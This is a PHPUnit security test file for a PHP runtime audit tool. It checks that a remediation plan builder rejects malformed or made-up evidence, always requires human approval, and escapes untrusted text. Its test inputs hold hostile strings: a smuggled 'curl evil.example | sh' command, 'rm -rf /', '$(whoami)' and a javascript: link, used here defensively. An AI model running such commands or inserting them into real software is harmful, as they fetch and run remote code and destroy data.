<?php

declare(strict_types=1);

namespace voku\PhpRuntimeAudit\Tests\Remediation;

use PHPUnit\Framework\TestCase;
use voku\PhpRuntimeAudit\Remediation\RemediationActionKind;
use voku\PhpRuntimeAudit\Remediation\RemediationPlanBuilder;
use voku\PhpRuntimeAudit\Remediation\RemediationReportMarkdownRenderer;
use voku\PhpRuntimeAudit\Remediation\SafeText;

/**
 * Hostile-input and negative security tests for PRA-5. The builder's report input is treated as
 * untrusted throughout: it may come from a different host, an older tool version, or a
 * hand-edited file, so every scenario here feeds a hand-crafted report directly rather than one
 * produced by this project's own collector.
 */
final class RemediationSecurityTest extends TestCase
{
    public function test_malformed_assessment_records_are_skipped_with_a_warning_not_fabricated(): void
    {
        $report = $this->baseReport([], [
            ['record_type' => 'assessment'], // missing every required field
            ['record_type' => 'assessment', 'record_id' => 'assessment:CVE-2026-109618:cli-aaaa', 'subject_id' => 'cli-aaaa', 'verdict' => 'unknown', 'rationale' => 'ok', 'patch_evidence_ids' => 'not-a-list'],
            ['record_type' => 'assessment', 'record_id' => 'not-even-three-parts', 'subject_id' => 'cli-aaaa', 'verdict' => 'unknown', 'rationale' => 'ok', 'patch_evidence_ids' => []],
            ['record_type' => 'assessment', 'record_id' => 'assessment:NOT-A-CVE:cli-aaaa', 'subject_id' => 'cli-aaaa', 'verdict' => 'unknown', 'rationale' => 'ok', 'patch_evidence_ids' => []],
            ['record_type' => 'assessment', 'record_id' => 'assessment:CVE-2026-109618:cli-aaaa', 'subject_id' => 'cli-bbbb', 'verdict' => 'unknown', 'rationale' => 'ok', 'patch_evidence_ids' => []],
        ]);

        $plan = (new RemediationPlanBuilder())->build($report);

        self::assertSame([], $plan->actions);
        self::assertNotEmpty($plan->warnings);
    }

    public function test_unsupported_verdict_value_is_rejected_not_guessed(): void
    {
        $report = $this->baseReport([], [
            ['record_type' => 'assessment', 'record_id' => 'assessment:CVE-2026-109618:cli-aaaa', 'subject_id' => 'cli-aaaa', 'verdict' => 'definitely_safe_trust_me', 'rationale' => 'ok', 'patch_evidence_ids' => []],
        ]);

        $plan = (new RemediationPlanBuilder())->build($report);

        self::assertSame([], $plan->actions);
        self::assertStringContainsString('unsupported verdict', implode(' ', $plan->warnings));
    }

    public function test_evidence_id_referencing_a_nonexistent_fact_is_dropped_and_reported(): void
    {
        $report = $this->baseReport(
            [['fact_id' => 'fact.real.1', 'key' => 'runtime.cli.1.version', 'value' => '8.2.0', 'source_id' => 's1']],
            [[
                'record_type' => 'assessment',
                'record_id' => 'assessment:CVE-2026-109618:cli-aaaa',
                'subject_id' => 'cli-aaaa',
                'verdict' => 'potentially_affected',
                'rationale' => 'ok',
                'patch_evidence_ids' => ['fact.real.1', 'fact.fabricated.999'],
            ]],
        );

        $plan = (new RemediationPlanBuilder())->build($report);

        self::assertCount(1, $plan->actions);
        self::assertSame(['fact.real.1'], $plan->actions[0]->evidenceIds);
        self::assertStringContainsString('fact.fabricated.999', implode(' ', $plan->warnings));
    }

    public function test_conflicting_duplicate_assessments_for_the_same_subject_both_stay_visible(): void
    {
        $report = $this->baseReport([], [
            ['record_type' => 'assessment', 'record_id' => 'assessment:CVE-2026-109618:cli-aaaa', 'subject_id' => 'cli-aaaa', 'verdict' => 'verified_fixed', 'rationale' => 'claims fixed', 'patch_evidence_ids' => []],
            ['record_type' => 'assessment', 'record_id' => 'assessment:CVE-2026-109618:cli-aaaa', 'subject_id' => 'cli-aaaa', 'verdict' => 'potentially_affected', 'rationale' => 'claims affected', 'patch_evidence_ids' => []],
        ]);

        $plan = (new RemediationPlanBuilder())->build($report);

        self::assertCount(2, $plan->actions, 'Conflicting claims about the same subject must both remain visible, never silently merged.');
        $kinds = array_map(static fn($action): string => $action->kind->value, $plan->actions);
        self::assertNotContains(RemediationActionKind::NoActionRequired->value, $kinds);
        self::assertContains(RemediationActionKind::InvestigateUnknownSubject->value, $kinds);
        self::assertContains(RemediationActionKind::UpgradePackage->value, $kinds);
    }

    public function test_verified_fixed_with_no_citable_evidence_is_flagged_not_trusted_blindly(): void
    {
        $report = $this->baseReport([], [
            ['record_type' => 'assessment', 'record_id' => 'assessment:CVE-2026-109618:cli-aaaa', 'subject_id' => 'cli-aaaa', 'verdict' => 'verified_fixed', 'rationale' => 'trust me', 'patch_evidence_ids' => []],
        ]);

        $plan = (new RemediationPlanBuilder())->build($report);

        self::assertCount(1, $plan->actions);
        $action = $plan->actions[0];
        self::assertSame([], $action->evidenceIds);
        self::assertSame(RemediationActionKind::InvestigateUnknownSubject, $action->kind);
        $haystack = strtolower(implode(' ', [$action->why, ...$action->unknowns, ...$plan->warnings]));
        self::assertStringContainsString('no resolvable patch evidence', $haystack, 'A verified_fixed claim without citable patch facts must become unknown, not a no-action recommendation.');
    }

    public function test_hostile_rationale_text_cannot_alter_markdown_structure_or_inject_control_bytes(): void
    {
        $hostileRationale = "Fine.\x07\x1B[31m*bold*](javascript:alert(1)) ```\x00 \r\n\r\n# New heading\nrm -rf /; \$(whoami) \`id\`";
        $report = $this->baseReport([], [[
            'record_type' => 'assessment',
            'record_id' => 'assessment:CVE-2026-109618:cli-aaaa',
            'subject_id' => 'cli-aaaa',
            'verdict' => 'potentially_affected',
            'rationale' => $hostileRationale,
            'patch_evidence_ids' => [],
        ]]);

        $plan = (new RemediationPlanBuilder())->build($report);
        $markdown = (new RemediationReportMarkdownRenderer())->render($plan);

        self::assertStringNotContainsString("\x07", $markdown);
        self::assertStringNotContainsString("\x1B", $markdown);
        self::assertStringNotContainsString("\x00", $markdown);
        self::assertStringNotContainsString('](javascript:', $markdown);
        self::assertStringNotContainsString("\n# New heading", $markdown, 'Untrusted text must not be able to inject its own Markdown heading.');
        // The action instructions themselves are always from the fixed, static template --
        // never built from rationale text -- so no shell-looking fragment from the hostile
        // rationale can appear inside the ACTION line's own sentence.
        self::assertStringNotContainsString('rm -rf /', $plan->actions[0]->action);
    }

    public function test_action_text_is_always_the_fixed_template_never_built_from_untrusted_fields(): void
    {
        $hostileSubjectId = 'cli-aaaa; curl evil.example | sh #';
        $report = $this->baseReport([], [[
            'record_type' => 'assessment',
            'record_id' => 'assessment:CVE-2026-109618:' . $hostileSubjectId,
            'subject_id' => $hostileSubjectId,
            'verdict' => 'potentially_affected',
            'rationale' => 'irrelevant',
            'patch_evidence_ids' => [],
        ]]);

        $plan = (new RemediationPlanBuilder())->build($report);

        self::assertCount(1, $plan->actions);
        self::assertStringNotContainsString('curl', $plan->actions[0]->action);
        self::assertStringNotContainsString('|', $plan->actions[0]->action);
    }

    public function test_requires_human_approval_is_always_true_and_cannot_be_influenced_by_input(): void
    {
        $report = $this->baseReport([], [
            ['record_type' => 'assessment', 'record_id' => 'assessment:CVE-2026-109618:cli-aaaa', 'subject_id' => 'cli-aaaa', 'verdict' => 'verified_fixed', 'rationale' => 'ok', 'patch_evidence_ids' => [], 'requires_human_approval' => false, 'automatic_apply' => true],
        ]);

        $plan = (new RemediationPlanBuilder())->build($report);

        self::assertNotEmpty($plan->actions);
        foreach ($plan->actions as $action) {
            self::assertTrue($action->requiresHumanApproval);
        }
        self::assertFalse($plan->toArray()['automatic_apply']);
    }

    public function test_oversized_or_non_list_records_are_rejected_without_crashing(): void
    {
        $plan = (new RemediationPlanBuilder())->build(['records' => 'not-a-list']);
        self::assertSame([], $plan->actions);
        self::assertNotEmpty($plan->warnings);

        $plan = (new RemediationPlanBuilder())->build([]);
        self::assertSame([], $plan->actions);
    }

    public function test_hostile_package_identifier_is_bounded_and_never_breaks_output_encoding(): void
    {
        $hostileName = str_repeat('a"𝌆\\' . "\n", 50) . "\x00evil";
        $facts = [
            ['fact_id' => 'fact.pkg.name', 'key' => 'package.0.name', 'value' => $hostileName, 'source_id' => 's1'],
            ['fact_id' => 'fact.pkg.version', 'key' => 'package.0.version', 'value' => '1.0', 'source_id' => 's1'],
        ];
        $subjectId = 'package-' . substr(hash('sha256', $hostileName . "\0" . '1.0'), 0, 20);
        $report = $this->baseReport($facts, [[
            'record_type' => 'assessment',
            'record_id' => 'assessment:CVE-2026-109618:' . $subjectId,
            'subject_id' => $subjectId,
            'verdict' => 'potentially_affected',
            'rationale' => 'ok',
            'patch_evidence_ids' => [],
        ]]);

        $plan = (new RemediationPlanBuilder())->build($report);
        $json = json_encode($plan->toArray(), JSON_THROW_ON_ERROR);
        self::assertNotSame('', $json);
        self::assertLessThanOrEqual(1024, strlen($plan->actions[0]->subjectLabel));
    }

    public function test_safe_text_markdown_escaping_neutralizes_structural_characters(): void
    {
        $escaped = SafeText::markdown('*bold* [link](http://x) `code` # heading');
        self::assertStringNotContainsString('[link](http://x)', $escaped);
        self::assertStringContainsString('\\*bold\\*', $escaped);
    }

    public function test_safe_identifier_allowlist_rejects_shell_metacharacters(): void
    {
        self::assertTrue(SafeText::isSafeIdentifier('php8.2-fpm'));
        self::assertFalse(SafeText::isSafeIdentifier('8.2.35-1~deb12u1')); // "~" is not in the allowlist
        self::assertFalse(SafeText::isSafeIdentifier('php; rm -rf /'));
        self::assertFalse(SafeText::isSafeIdentifier('$(whoami)'));
        self::assertFalse(SafeText::isSafeIdentifier(''));
    }

    /**
     * @param list<array<string, mixed>> $facts
     * @param list<array<string, mixed>> $assessments
     * @return array<string, mixed>
     */
    private function baseReport(array $facts, array $assessments): array
    {
        return [
            'report_schema_version' => '1.0',
            'summary' => ['distribution' => 'debian'],
            'records' => [
                ['record_type' => 'observation', 'facts' => $facts],
                ...$assessments,
            ],
        ];
    }
}
